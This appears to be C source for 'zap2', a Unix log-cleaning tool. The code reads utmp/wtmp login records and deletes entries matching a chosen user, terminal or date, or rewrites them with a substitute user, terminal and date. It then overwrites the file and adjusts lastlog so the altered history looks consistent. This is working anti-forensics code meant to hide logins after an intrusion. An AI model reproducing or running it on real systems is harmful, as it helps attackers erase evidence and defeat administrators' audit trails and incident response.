#include "zap2.h"

int compare(const void *a, const void *b)
{
    int32_t a_sec = (*(struct utmp **)a)->ut_time;
    int32_t b_sec = (*(struct utmp **)b)->ut_time;
    if (a_sec == b_sec)
        return 0;
    if (a_sec > b_sec)
        return 1;
    else
        return -1;
};

void sort_utmp_arr()
{
    qsort(utmp_arr, sz, sizeof(struct utmp *), compare);
    return;
}

bool chk(struct utmp utmp_ent)
{
    bool flag = 1;
    if (flag_t)
    {
        flag *= strncmp(utmp_ent.ut_line, line, strlen(line)+1) == 0;
    }
    if (flag_a || flag_A || flag_R)
    {
        flag *= strncmp(utmp_ent.ut_user, user, strlen(user)+1) == 0;
        // printf("chk: a: %s %s %d\n", utmp_ent.ut_user, user, flag);
    }
    if (flag_d)
    {
        time_t tmp_time = (time_t)utmp_ent.ut_time;
        struct tm tmp_date;
        localtime_r(&tmp_time, &tmp_date);
        // printf("year: %d mon: %d day: %d\n", tmp_date.tm_year, tmp_date.tm_mon, tmp_date.tm_mday);
        flag *= tmp_date.tm_year == date.tm_year;
        flag *= tmp_date.tm_mon == date.tm_mon;
        flag *= tmp_date.tm_mday == date.tm_mday;
    }
    return flag;
}

void push_to_arr(struct utmp utmp_ent)
{
    utmp_arr[sz] = (struct utmp *)malloc(sizeof(struct utmp));
    memcpy(utmp_arr[sz], &utmp_ent, sizeof(struct utmp));
    sz++;
}

void build_utmp_arr()
{
    sz = 0;
    struct utmp utmp_ent;
    int f = open(path, O_RDWR);
    if (f<0){
        printf("[-] Can't open %s\n", path);
        exit(EXIT_FAILURE);
    }
    // fprintf(stdout,"[+] build: open %s\n", path);
    while (read(f, &utmp_ent, sizeof(utmp_ent)) > 0)
    {
        // printf("sz: %d, user: %s, line: %s, date: %d\n", sz, utmp_ent.ut_user, utmp_ent.ut_line, utmp_ent.ut_time);
        if (chk(utmp_ent))
        {
            if (flag_R)
            {
                memcpy(utmp_ent.ut_user, user_r, strlen(user_r) + 1);
                if (flag_t)
                {
                    memcpy(utmp_ent.ut_line, line_r, strlen(line_r) + 1);
                }
                if (flag_d)
                {
                    long tmp_time = utmp_ent.ut_time;
                    struct tm tmp_tm;
                    localtime_r(&tmp_time, &tmp_tm);
                    tmp_tm.tm_year = date_r.tm_year;
                    tmp_tm.tm_mon = date_r.tm_mon;
                    tmp_tm.tm_mday = date_r.tm_mday;

                    utmp_ent.ut_time =  mktime(&tmp_tm);
                    // utmp_ent.ut_time = (int32_t)mktime(&date_r);
                }
                push_to_arr(utmp_ent);
            }
        }
        else
        {
            push_to_arr(utmp_ent);
        }
    }
    close(f);
    // fprintf(stdout,"---- build end ----\n");
}

void write_utmp_arr()
{
    int f = open(path,  O_WRONLY | O_TRUNC);
    if (f<0){
        printf("[-] write_utmp_arr: Can't open %s\n", path);
        exit(EXIT_FAILURE);
    }
    int i;
    for (i = 0; i < sz; i++)
    {
        write(f, utmp_arr[i], sizeof(struct utmp));
    }

    close(f);
}

void write_lastlog()
{
    int f;
    struct passwd *pwd;
    struct lastlog ll_ent;

    if ((f = open(lastlog_path, O_RDWR)) >= 0)
    {
        uid_t uid = 0;
        while (read(f, &ll_ent, sizeof(struct lastlog)) > 0)
        {
            if ((pwd = getpwuid(uid)) != NULL)
            {
                bool flag = 0;
                int i;
                for (i = 0; i < sz; i++)
                {
                    struct utmp *utmp_ent = utmp_arr[i];
                    if (strncmp(pwd->pw_name, utmp_ent->ut_user, strlen(utmp_ent->ut_user) + 1) == 0)
                    {
                        if (!flag || utmp_ent->ut_time >= ll_ent.ll_time)
                        {
                            flag = 1;
                            strcpy(ll_ent.ll_line, utmp_ent->ut_line);
                            strcpy(ll_ent.ll_host, utmp_ent->ut_host);
                            ll_ent.ll_time = utmp_ent->ut_time;
                            lseek(f, (long)pwd->pw_uid * sizeof(struct lastlog), 0);
                            write(f, &ll_ent, sizeof(struct lastlog));
                        }
                    }
                }
                if (!flag)
                {
                    lseek(f, (long)pwd->pw_uid * sizeof(struct lastlog), 0);
                    memset(&ll_ent, 0, sizeof(struct lastlog));
                    write(f, &ll_ent, sizeof(struct lastlog));
                }
            }
            uid++;
        }
        close(f);
    }
}

void clear_utmp_arr()
{
    int i;
    for (i = 0; i < sz; i++)
    {
        free(utmp_arr[i]);
    }
    sz = 0;
}

void zap2()
{
    build_utmp_arr();
    sort_utmp_arr();
    write_utmp_arr();
    write_lastlog();
    clear_utmp_arr();
}
